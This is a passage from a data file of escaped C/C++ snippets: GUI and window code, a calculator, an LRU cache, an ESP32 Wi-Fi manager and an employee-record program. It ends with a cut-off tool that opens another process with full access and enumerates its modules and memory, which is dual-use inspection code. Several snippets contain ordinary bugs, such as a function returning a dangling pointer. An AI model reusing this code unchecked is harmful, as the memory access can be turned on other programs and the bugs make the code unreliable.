throttle}))\n\t\t{\n\t\t\t/// - Failed to transmit log error message and add to commandqueue to transmit the command later\n\t\t\tcommandQueue.push_back(command);\n\t\t\tcommandQueue.push_back(throttle);\n\t\t\terror = FailedToTransmitCommands;\n\t\t}\n\t\tretu",
    "#include \"Rational.h\"\n#include <iostream>\nusing namespace std;\n\nint main()\n{\nint num1, num2, num3;\nchar junk;\ncout << \"part 1. ctor/set/get\" << endl;\ncout << \"enter a rational number:\" << endl;\ncin >> num1 >> junk >> num2;\nRational rat1;\nrat1.setNumerator(num1);\nrat1.setDenominator(num2);\ncout << \"numerator: \" << rat1.getNumerator() << endl;\ncout << \"denominator: \" << rat1.getDenominator() << endl;\ncout << endl;\ncout << \"enter a rational number: \" << endl;\ncin >> num1 >> junk >> num2;\nRational rat2(num1,num2);\nrat2.print();\ncout << endl << endl;\ncout << \"part 2. copy-ctor\" << endl;\nRational rat3(rat2);\nrat3.print();\ncout << endl << endl;\ncout << \"part 3. equals\" << endl;\nif (rat1.equal(rat2))\ncout << \"The two numbers are equal\" << endl;\nelse\ncout << \"The two numbers are different\" << endl;\ncout << endl;\ncout << \"part 4. makeEquals\" << endl;\nrat1.makeEquals(rat2);\nif (rat1.equal(rat2))\ncout << \"The two numbers are equal\" << endl;\nelse\ncout << \"The two numbers are different\" << endl;\ncout << endl;\ncout << \"part 5. addOne\" << endl;\nRational ans1;\nans1 = rat1.addOne();\nrat1.print();\ncout << \" + 1 = \";\nans1.print();\ncout << endl<<endl;\ncout << \"part 6. add\" << endl;\nRational ans2;\nans2 = rat1.add(rat3);\nrat1.print();\ncout << \" + \";\n\n",
    "#include \"pch.h\"\n#include \"gui.h\"\n#include \"images.h\"\n#include \"core/core.h\"\n\nvoid NotificationManager::add(float duration, bool play_sound, const char* format, ...)\n{\n\tva_list args;\n\tva_start(args, format);\n\tint size = std::vsnprintf(nullptr, 0, format, args);\n\tva_end(args);\n\n\tif (size <= 0) return;\n\n\tstd::vector<char> buffer(size + 1);\n\tva_start(args, format);\n\tstd::vsnprintf(buffer.data(), buffer.size(), format, args);\n\tva_end(args);\n\n\tnotifications.emplace_back(std::string(buffer.data()), duration, play_sound);\n}\nvoid NotificationManager::render(int windowWidth, int windowHeight)\n{\n\tfloat yOffset = 50.0f;\n\n\tfor (auto it = notifications.begin(); it != notifications.end(); )\n\t{\n\t\tauto& notif = *it;\n\t\tauto elapsed = std::chrono::duration<float>(std::chrono::steady_clock::now() - notif.startTime).count();\n\t\tif (elapsed > notif.duration.count())\n\t\t{\n\t\t\tit = notifications.erase(it);\n\t\t\tcontinue;\n\t\t}\n\t\telse\n\t\t{\n\t\t\t++it;\n\t\t}\n\n\t\tif (notif.play_sound)\n\t\t{\n\t\t\tgui::play_sound(gui::pcm, gui::waveFormat);\n\t\t\tnotif.play_sound = false;\n\t\t}\n\n\t\tfloat alpha = 1.0f;\n\t\tif (elapsed < notif.fadeDuration)\n\t\t\talpha = elapsed / notif.fadeDuration;\n\t\telse if (notif.duration.count() - elapsed < notif.fadeDuration)\n\t\t\talpha = (notif.duration.count() - elapsed) / notif.fadeDuration;\n\n\t\tImVec4 messageColor = ImVec4(1.0f, 1.0f, 1.0f, alpha);\n\t\tImVec4 backgroundColor = ImVec4(0.1f, 0.1f, 0.1f, 0.9f * alpha);\n\n\t\tfloat textWidth = ImGui::CalcTextSize(notif.message.c_str()).x;\n\t\tfloat textHeight = ImGui::CalcTextSize(notif.message.c_str()).y;\n\n\t\tImVec2 textPosition = ImVec2(20.0f, windowHeight - yOffset);\n\t\tImVec2 rectMin = ImVec2(textPosition.x - 5, textPosition.y - 5);\n\t\tImVec2 rectMax = ImVec2(textPosition.x + textWidth + 5, textPosition.y + textHeight + 5);\n\n\t\tImGui::GetWindowDrawList()->AddRectFilled(rectMin, rectMax, ImGui::ColorConvertFloat4ToU32(backgroundColor), 10.0f);\n\n\t\tImGui::PushStyleColor(ImGuiCol_Text, messageColor);\n\t\tImGui::SetCursorPos(textPosition);\n\t\tImGui::Text(\"%s\", notif.message.c_str());\n\t\tImGui::PopStyleColor();\n\n\t\tyOffset += textHeight + 25.0f;\n\t}\n}\n\nconst WCHAR* StringToWChar(const std::string& s)\n{\n\tint size_needed = MultiByteToWideChar(CP_UTF8, 0, &s[0], (int)s.size(), NULL, 0);\n\tstd::vector<WCHAR> wstrTo(size_needed, 0);\n\tMultiByteToWideChar(CP_UTF8, 0, &s[0], (int)s.size(), &wstrTo[0], size_needed);\n\treturn &wstrTo[0];\n}\nconst std::string WCharToString(const WCHAR* s)\n{\n\tint bufferSize = WideCharToMultiByte(CP_UTF8, 0, s, -1, nullptr, 0, nullptr, nullptr);\n\tstd::string narrow(bufferSize, 0);\n\tWideCharToMultiByte(CP_UTF8, 0, s, -1, &narrow[0], bufferSize, nullptr, nullptr);\n\tnarrow.pop_back();\n\treturn narrow;\n}\n\nIDirect3DTexture9* gui::D3D9LoadImage(IDirect3DDevice9* device, const unsigned char* imageData, size_t imageSize) {\n\tIDirect3DTexture9* texture = nullptr;\n\tHRESULT hr = D3DXCreateTextureFromFileInMemory(\n\t\tdevice,\n\t\timageData,\n\t\timageSize,\n\t\t&texture\n\t);\n\n\tif (FAILED(hr)) {\n\t\t// Handle error\n\t\treturn nullptr;\n\t}\n\n\treturn texture;\n}\nextern IMGUI_IMPL_API LRESULT ImGui_ImplWin32_WndProcHandler( HWND window, UINT message, WPARAM wideParameter, LPARAM longParameter);\nLRESULT CALLBACK WindowProcess(HWND window, UINT message, WPARAM wideParameter, LPARAM longParameter)\n{\n\tif (ImGui_ImplWin32_WndProcHandler(window, message, wideParameter, longParameter))\n\t\treturn true;\n\n\tswitch (message)\n\t{\n\tcase WM_SIZE: {\n\t\tif (gui::device && wideParameter != SIZE_MINIMIZED)\n\t\t{\n\t\t\tgui::presentParameters.BackBufferWidth = LOWORD(longParameter);\n\t\t\tgui::presentParameters.BackBufferHeight = HIWORD(longParameter);\n\t\t\tgui::ResetDevice();\n\t\t}\n\t}return 0;\n\n\tcase WM_SYSCOMMAND: {\n\t\tif ((wideParameter & 0xfff0) == SC_KEYMENU)\n\t\t\treturn 0;\n\t}break;\n\n\tcase WM_DESTROY: {\n\t\tPostQuitMessage(0);\n\t}return 0;\n\n\tcase WM_LBUTTONDOWN: {\n\t\tgui::position = MAKEPOINTS(longParameter);\n\t}return 0;\n\n\tcase WM_MOUSEMOVE: {\n\t\tif (wideParameter == MK_LBUTTON)\n\t\t{\n\t\t\tconst auto points = MAKEPOINTS(longParameter);\n\t\t\tauto rect = ::RECT{ };\n\n\t\t\tGetWindowRect(gui::window, &rect);\n\n\t\t\trect.left += points.x - gui::position.x;\n\t\t\trect.top += points.y - gui::position.y;\n\n\t\t\tif (gui::position.x >= 0 &&\n\t\t\t\tgui::position.x <= gui::window_size.x &&\n\t\t\t\tgui::position.y >= 0 && gui::position.y <= 30)\n\t\t\t\tSetWindowPos(\n\t\t\t\t\tgui::window,\n\t\t\t\t\tHWND_TOPMOST,\n\t\t\t\t\trect.left,\n\t\t\t\t\trect.top,\n\t\t\t\t\t0, 0,\n\t\t\t\t\tSWP_SHOWWINDOW | SWP_NOSIZE | SWP_NOZORDER\n\t\t\t\t);\n\t\t}\n\n\t}return 0;\n\t}\n\n\treturn DefWindowProc(window, message, wideParameter, longParameter);\n}\nvoid gui::CreateHWindow(const char* windowName) noexcept\n{\n\twindowClass.cbSize = sizeof(WNDCLASSEX);\n\twindowClass.style = CS_CLASSDC;\n\twindowClass.lpfnWndProc = WindowProcess;\n\twindowClass.cbClsExtra = 0;\n\twindowClass.cbWndExtra = 0;\n\twindowClass.hInstance = GetModuleHandleA(0);\n\twindowClass.hIcon = 0;\n\twindowClass.hCursor = 0;\n\twindowClass.hbrBackground = 0;\n\twindowClass.lpszMenuName = 0;\n\twindowClass.lpszClassName = StringToWChar(windowClassVar);\n\twindowClass.hIconSm = 0;\n\n\tRegisterClassEx(&windowClass);\n\n\twindow = CreateWin",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"../../PPP_support/PPPheaders.h\"\n\n// Calculate operations left-to-right, not considering order of operations\nint main() {\n    // Prompt\n    cout << \"Enter an expression (we support '+', '-', '*', '/', and '%'), terminating with '=': \";\n\n    // Get first operand\n    double lval;\n    cin >> lval;\n\n    // Calculate operations\n    while(true)\n    {\n        // Get operator-operand pairs or terminating character\n        char op = '0';\n        cin >> op;\n        if (op == '=') // User terminates with '='\n        {\n            break;\n        }\n        double rval;\n        cin >> rval;\n\n        // Check operator and calculate\n        switch(op)\n        {\n            case '+':\n                lval += rval;\n                break;\n            case '-':\n                lval -= rval;\n                break;\n            case '*':\n                lval *= rval;\n                break;\n            case '/':\n                lval /= rval;\n                break;\n            case '%':\n                lval = fmod(lval, rval); // % is int only\n                break;\n            default:\n                error(\"Unrecognised operator\");\n        }\n    }\n\n    // Output\n    cout << \"Result: \" << lval << endl;\n}",
    "#include <iostream>\n#include <unordered_map>\n#include <list>\n#include <mutex>\n#include <memory>\n\ntemplate<typename KeyType, typename ValueType>\nclass LRUCache {\npublic:\n    // Constructor to init the cache w/ a given capacity\n    explicit LRUCache(size_t size) : capacity(size) {}\n\n    // Function to retrieve a value from the cache\n    ValueType get(const KeyType& key) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock for thread safety\n        auto it = cache_map.find(key);  // Attempt to find the key in the hash map\n        if (it == cache_map.end()) {\n            throw std::range_error(\"Key not found\");  // Key not found, throw exception\n        }\n        \n        usage_list.splice(usage_list.begin(), usage_list, it->second); // Moves accessed node\n        return it->second->second;  // Return the value associated with the key\n    }\n\n    // Function to insert or update a value in the cache\n    void put(const KeyType& key, const ValueType& value) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock for thread safety\n        auto it = cache_map.find(key);  // Check if key already exists in the cache\n        if (it != cache_map.end()) {\n            // If key exists -> MRU\n            usage_list.splice(usage_list.begin(), usage_list, it->second);\n            it->second->second = value;  // Update the value\n            return;\n        }\n\n        // If cache full, evict the LRU item\n        if (usage_list.size() == capacity) {\n            auto last = usage_list.end();\n            last--;\n            cache_map.erase(last->first);  // Remove from map\n            usage_list.pop_back();  // Remove from list\n        }\n\n        // Inserts the new key-value pair at the front of the list\n        usage_list.emplace_front(key, value);\n        cache_map[key] = usage_list.begin();  // Update map to point to the new element in the list\n    }\n\n    // Function to remove an object from the cache if it exists\n    void erase(const KeyType& key) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock to ensure thread safety\n        auto it = cache_map.find(key);  // Find the key in the map\n        if (it != cache_map.end()) {\n            usage_list.erase(it->second);  // Remove from list\n            cache_map.erase(it);  // Remove from map\n        }\n    }\n\n    // Function to dynamically adjust the cache's capacity\n    void resize(size_t new_capacity) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock to ensure thread safety\n        while (usage_list.size() > new_capacity) {  // If current size is larger than new capacity, reduce size\n            auto last = usage_list.end();\n            last--;\n            cache_map.erase(last->first);  // Remove least recently used items\n            usage_list.pop_back();\n        }\n        capacity = new_capacity;  // Set the new capacity\n    }\n\nprivate:\n    size_t capacity;  // Maximum number of elements in the cache\n    // List to track the least recent to most recently used objects\n    std::list<std::pair<KeyType, ValueType>> usage_list;  \n    // Map to quickly lookup elements in the list\n    std::unordered_map<KeyType, typename std::list<std::pair<KeyType, ValueType>>::iterator> cache_map;\n    std::mutex cache_mutex;  // Mutex to make class thread-safe\n};\n\nint main() {\n    LRUCache<int, std::string> cache(2);  // Create a cache for up to 2 items\n    cache.put(1, \"data1\");  // Insert item with key 1\n    cache.put(2, \"data2\");  // Insert item with key 2\n    try {\n        std::cout << \"1 -> \" << cache.get(1) << std::endl;  // Access item with key 1\n    } catch (const std::exception& e) {\n        std::cout << e.what() << std::endl;\n    }\n    cache.put(3, \"data3\");  // Insert item with key 3, causing key 2 to be evicted\n    try {\n        std::cout << \"2 -> \" << cache.get(2) << std::endl;  // Attempt to access item with key 2\n    } catch (const std::exception& e) {\n        std::cout << \"2 -> \" << e.what() << std::endl;  // Should print \"Key not found\"\n    }\n    return 0;\n}\n\n",
    "#include \"WifiManager.h\"\n#include <WiFi.h>\n#include <ESPmDNS.h>\n\nvoid on_wifi_event(WiFiEvent_t event) {\n\tswitch (event) {\n\t\tcase WiFiEvent_t::ARDUINO_EVENT_WIFI_STA_DISCONNECTED:\n\t\t\tSerial.println(\"Wi-fi disconnected. Enabling auto-reconnect\");\n\t\t\tWiFi.setAutoReconnect(true);\n\t\t\tbreak;\n\t\tdefault:\n      break;\n  }\n}\n\nvoid WifiManager::begin() {\n  WiFi.removeEvent(on_wifi_event);\n\n  WiFi.disconnect();\n  WiFi.setAutoConnect(false);\n  WiFi.setAutoReconnect(false);\n\n  _preferences.begin(\"wifi\", false);\n  String ssid = _preferences.getString(\"ssid\", \"\"); \n  String password = _preferences.getString(\"password\", \"\");\n  _preferences.end();\n\n  if (ssid != \"\" && password != \"\"){\n    WiFi.mode(WIFI_STA);\n    WiFi.begin(ssid.c_str(), password.c_str());\n    Serial.print(\"Connecting to WiFi ..\");\n    \n    byte retries = 0;\n    while (WiFi.status() != WL_CONNECTED && retries++ < 10) {\n      Serial.print('.');\n      delay(1000);\n    }\n\n    if(WiFi.status()== WL_CONNECTED) {\n      Serial.println(\"connected\");\n      Serial.print(\"   IP address: \");\n      Serial.println(WiFi.localIP());\n\n      WiFi.onEvent(on_wifi_event);\n\n      return;\n    }\n  }\n\n  WiFi.mode(WIFI_AP);\n  boolean result = WiFi.softAP(\"clock\", NULL);\n  if (result == true) {\n    Serial.println(\"AP created\");\n    Serial.print(\"   IP address: \");\n    Serial.println(WiFi.softAPIP());\n  }\n  else {\n    Serial.println(\"AP failed\");\n  }\n}\n\nvoid WifiManager::start_mdns(const char* host) {\n  if (!MDNS.begin(host)) {\n    Serial.println(\"Error setting up mDNS responder\");\n  }\n  Serial.println(\"mDNS responder started\");\n}\n\nvoid WifiManager::set_credentials(String ssid, String password) {\n  _preferences.begin(\"wifi\", false);\n  _preferences.putString(\"ssid\", ssid); \n  _preferences.putString(\"password\", password);\n  _preferences.end();\n\n  Serial.print(\"Stored ssid \");\n  Serial.println(ssid);\n}\n",
    "#include<iostream>\n#include<fstream>\n#include<stdio.h>\nusing namespace std;\n//Employee class Declaration\nclass Employee{\nprivate:\nint code;\nchar name[20];\nfloat salary;\npublic:\nvoid read();\nvoid display();\n//will return employee code\nint getEmpCode() { return code;}\n//will return employee salary\nint getSalary() { return salary;}\n//will update employee salary\nvoid updateSalary(float s) { salary=s;}\n};\n//Read employee record\nvoid Employee::read(){\ncout<<\"Enter employee code: \";\ncin>>code;\ncout<<\"Enter name: \";\ncin.ignore(1);\ncin.getline(name,20);\ncout<<\"Enter salary: \";\ncin>>salary;\n}\n//Display employee record\nvoid Employee::display()\n{\ncout<<code<<\" \"<<name<<\"\\t\"<<salary<<endl;\n}\n//global declaration\nfstream file;\n//Will delete file when program is being executed\n//because we are create file in append mode\nvoid deleteExistingFile(){\nremove(\"EMPLOYEE.DAT\");\n}\n//function to append record into file\nvoid appendToFille(){\nEmployee x;\n//Read employee record from user\nx.read();\nfile.open(\"EMPLOYEE.DAT\",ios::binary|ios::app);\nif(!file){\ncout<<\"ERROR IN CREATING FILE\\n\";\nreturn;\n}\n//write into file\nfile.write((char*)&x,sizeof(x));\nfile.close();\ncout<<\"Record added sucessfully.\\n\";\n}\nvoid displayAll(){\nEmployee x;\nfile.open(\"EMPLOYEE.DAT\",ios::binary|ios::in);\nif(!file){\ncout<<\"ERROR IN OPENING FILE \\n\";\nreturn;\n}\nwhile(file){\nif(file.read((char*)&x,sizeof(x)))\nif(x.getSalary()>=10000 && x.getSalary()<=20000)\nx.display();\n}\nfile.close();\n}\nvoid searchForRecord(){\n//read employee id\nEmployee x;\nint c;\nint isFound=0;\ncout<<\"Enter employee code: \";\ncin>>c;\nfile.open(\"EMPLOYEE.DAT\",ios::binary|ios::in);\nif(!file){\ncout<<\"ERROR IN OPENING FILE \\n\";\nreturn;\n}\nwhile(file){\nif(file.read((char*)&x,sizeof(x))){\nif(x.getEmpCode()==c){\ncout<<\"RECORD FOUND\\n\";\nx.display();\nisFound=1;\nbreak;\n}\n}\n}\nif(isFound==0){\ncout<<\"Record not found!!!\\n\";\n}\nfile.close();\n}\n//Function to increase salary\nvoid increaseSalary(){\n//read employee id\nEmployee x;\nint c;\nint isFound=0;\nfloat sal;\ncout<<\"enter employee code \\n\";\ncin>>c;\nfile.open(\"EMPLOYEE.DAT\",ios::binary|ios::in);\nif(!file){\ncout<<\"ERROR IN OPENING FILE \\n\";\nreturn;\n}\nwhile(file){\nif(file.read((char*)&x,sizeof(x))){\nif(x.getEmpCode()==c){\ncout<<\"Salary hike? \";\ncin>>sal;\nx.updateSalary(x.getSalary()+sal);\nisFound=1;\nbreak;\n}\n}\n}\nif(isFound==0){\ncout<<\"Record not found!!!\\n\";\n}\nfile.close();\ncout<<\"Salary updated successfully.\"<<endl;\n}\n//Insert record by assuming that records are in\n//ascending order\nvoid insertRecord(){\n//read employee record\nEmployee x;\nEmployee newEmp;\n//Read record to insert\nnewEmp.read();\nfstream fin;\n//read file in input mode\nfile.open(\"EMPLOYEE.DAT\",ios::binary|ios::in);\n//open file in write mode\nfin.open(\"TEMP.DAT\",ios::binary|ios::out);\nif(!file){\ncout<<\"Error in opening EMPLOYEE.DAT file!!!\\n\";\nreturn;\n}\nif(!fin){\ncout<<\"Error in opening TEMP.DAT file!!!\\n\";\nreturn;\n}\nwhile(file){\nif(file.read((char*)&x,sizeof(x))){\nif(x.getEmpCode()>newEmp.getEmpCode()){\nfin.write((char*)&newEmp, sizeof(newEmp));\n}\n//no need to use else\nfin.write((char*)&x, sizeof(x));\n}\n}\nfin.close();\nfile.close();\nrename(\"TEMP.DAT\",\"EMPLOYEE.DAT\");\nremove(\"TEMP.DAT\");\ncout<<\"Record inserted successfully.\"<<endl;\n}\nint main()\n{\nchar ch;\n//if required then only remove the file\ndeleteExistingFile();\ndo{\nint n;\ncout<<\"ENTER CHOICE\\n\"<<\"1.ADD AN EMPLOYEE\\n\"<<\"2.DISPLAY\\n\"<<\"3.SEARCH\\n\"<<\"4.INCREASE SALARY\\n\"<<\"5.INSERT RECORD\\n\";\ncout<<\"Make a choice: \";\ncin>>n;\nswitch(n){\ncase 1:\nappendToFille();\nbreak;\ncase 2 :\ndisplayAll();\nbreak;\ncase 3:\nsearchForRecord();\nbreak;\ncase 4:\nincreaseSalary();\nbreak;\ncase 5:\ninsertRecord();\nbreak;\ndefault :\ncout<<\"Invalid Choice\\n\";\n}\ncout<<\"Do you want to continue ? : \";\ncin>>ch;\n}while(ch=='Y'||ch=='y');\nreturn 0;\n}\n",
    "#include <iostream>\r\n#include <cassert>\r\n#include <cstdlib>\r\n#include <Windows.h>\r\n#include <Psapi.h>\r\n#include <tlhelp32.h>\r\n\r\n#define MAX_STR_SIZE 192\r\n#define MAX_MODULE_AMOUNT 128\r\n#define MAX_MEM_AMOUNT 10000\r\n\r\n#define MAX_MODULE_AMOUNT_IN_BYTES MAX_MODULE_AMOUNT * sizeof(HMODULE)\r\n\r\n#undef min\r\n#undef Process32First\r\n#undef Process32Next\r\n#undef PROCESSENTRY32\r\n\r\nUCHAR strcmp_leastchar(const char* a, const char* b, const char* la = nullptr)\r\n{\r\n\tconst char* lb = b;\r\n\r\n\tif (la == nullptr)\r\n\t{\r\n\t\tla = a;\r\n\t\twhile (*la) la++;\r\n\t}\r\n\r\n\twhile (*lb) lb++;\r\n\r\n\tint min_size = -std::min(la - a, lb - b);\r\n\tUCHAR c = 0;\r\n\r\n\tfor (int i = -1; i >= min_size; i--)\r\n\t\tc += (la[i] == lb[i]);\r\n\r\n\treturn c;\r\n}\r\n\r\nstd::string GetLastErrorAsString()\r\n{\r\n\t//Get the error message ID, if any.\r\n\tDWORD errorMessageID = ::GetLastError();\r\n\tif (errorMessageID == 0) {\r\n\t\treturn std::string(); //No error message has been recorded\r\n\t}\r\n\r\n\tLPSTR messageBuffer = nullptr;\r\n\r\n\t//Ask Win32 to give us the string version of that message ID.\r\n\t//The parameters we pass in, tell Win32 to create the buffer that holds the message for us (because we don't yet know how long the message string will be).\r\n\tsize_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,\r\n\t\tNULL, errorMessageID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);\r\n\r\n\t//Copy the error message into a std::string.\r\n\tstd::string message(messageBuffer, size);\r\n\r\n\t//Free the Win32's string's buffer.\r\n\tLocalFree(messageBuffer);\r\n\r\n\treturn message;\r\n}\r\n\r\nstruct mem_info_s\r\n{\r\n\tvoid* BaseAddress;\r\n\tSIZE_T RegionSize;\r\n\tbool is_priorited;\r\n};\r\n\r\nsize_t app_mem_size = 0;\r\n\r\nstruct info_s\r\n{\r\n\tbool alive;\r\n\r\n\tDWORD pId, module_amount, error_code;\r\n\tHMODULE* modules;\r\n\tMODULEINFO* module_infos;\r\n\r\n\tsize_t buck_mem_size;\r\n\r\n\tHMODULE main_module;\r\n\tvoid* module_base;\r\n\tMODULEINFO main_module_info;\r\n\tLPSTR main_module_file_name;\r\n\r\n\tmem_info_s* mem_addresses;\r\n\tDWORD mem_amount;\r\n\r\n\tHANDLE proc;\r\n\r\n\tinfo_s(DWORD pId_In) : pId(pId_In)\r\n\t{\r\n\t\tmodule_infos = nullptr;\r\n\t\tmem_addresses = nullptr;\r\n\t\tmem_amount = 0;\r\n\t\talive = false;\r\n\t\tmain_module = 0;\r\n\t\tmain_module_info = { nullptr, 0, nullptr };\r\n\t\tmodule_amount = error_code = 0;\r\n\t\tmodules = nullptr;\r\n\t\tproc = nullptr;\r\n\r\n\t\tmain_module_file_name = (LPSTR)malloc(MAX_STR_SIZE);\r\n\t\tLPSTR cache_file_name = (LPSTR)malloc(MAX_STR_SIZE);\r\n\r\n\t\tif (main_module_file_name == nullptr || cache_file_name == nullptr) {\r\n\t\t\terror_code = 1;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tmain_module_file_name[MAX_STR_SIZE - 1] = '\\0';\r\n\t\tcache_file_name[MAX_STR_SIZE - 1] = '\\0';\r\n\r\n\t\tmodules = (HMODULE*)malloc(MAX_MODULE_AMOUNT_IN_BYTES);\r\n\t\tmodule_infos = (MODULEINFO*)malloc(MAX_MODULE_AMOUNT * sizeof(MODULEINFO));\r\n\r\n\t\tif (modules == nullptr || module_infos == nullptr) {\r\n\t\t\terror_code = 2;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tproc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pId_In);\r\n\r\n\t\tGetProcessImageFileNameA(proc, main_module_file_name, MAX_STR_SIZE);\r\n\r\n\t\tEnumProcessModules(proc, modules, MAX_MODULE_AMOUNT_IN_BYTES, &module_amount);\r\n\r\n\t\tif (module_amount > MAX_MODULE_AMOUNT_IN_BYTES) {\r\n\t\t\terror_code = 3;\r\n\t\t\treturn;\r\n\t\t}\r\n\r\n\t\tmodule_amount /= sizeof(HMODULE);\r\n\r\n\t\tconst char* least_char_on_main = main_module_file_name;\r\n\t\twhile (*least_char_on_main) least_char_on_main++;\r\n\r\n\t\tMODULEINFO module_info;\r\n\r\n\t\tfor (DWORD i = 0; i < module_amount; i++)\r\n\t\t{\r\n\t\t\tDWORD err = GetModuleFileNameA(modules[i], cache_file_name, MAX_STR_SIZE);\r\n\t\t\tGetModuleInformation(proc, modules[i], &module_info, sizeof(MODULEINFO));\r\n\t\t\tmodule_infos[i] = module_info;\r\n\r\n\t\t\tif (err == 0)\r\n\t\t\t{\r\n\t\t\t\tcache_file_name[0] = '?';\r\n\t\t\t\tcache_file_name[1] = '\\0';\r\n\t\t\t}\r\n\r\n\t\t\tstd::cout << i << \":\\t\" << module_info.lpBaseOfDll << \": \" << cache_file_name << '\\n';\r\n\t\t}\r\n\r\n\t\tmain_module_info = module_infos[0];\r\n\t\tmain_module = modules[0];\r\n\r\n\t\tmodule_base = (void*)main_module;\r\n\r\n\t\tfree(cache_file_name);\r\n\r\n\t\tstd::cout << \"\\nModule Name:\\t\" << main_module_file_name\r\n\t\t\t<< \"\\nModule Base:\\t0x\" << module_base\r\n\t\t\t<< \"\\nCum Base:\\t0x\" << main_module_info.EntryPoint\r\n\t\t\t<< \"\\nModule Size:\\t\" << main_module_info.SizeOfImage\r\n\t\t\t<< \"\\nModule Amount:\\t\" << module_amount\r\n\t\t\t<< \"\\npId:\\t\\t\" << pId\r\n\t\t\t<< std::endl;\r\n\r\n\t\talive = true;\r\n\t}\r\n\r\n\tvoid get_memory_infos()\r\n\t{\r\n\t\tif (alive == false)\r\n\t\t\treturn;\r\n\r\n\t\tif (mem_addresses == 